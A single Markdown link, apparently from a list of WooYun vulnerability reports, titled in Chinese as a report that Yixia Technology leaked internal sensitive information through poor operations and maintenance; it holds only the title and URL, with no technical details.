[一下科技运维不当导致内部敏感信息泄漏](http://www.wooyun.org/bugs/wooyun-2010-0134151)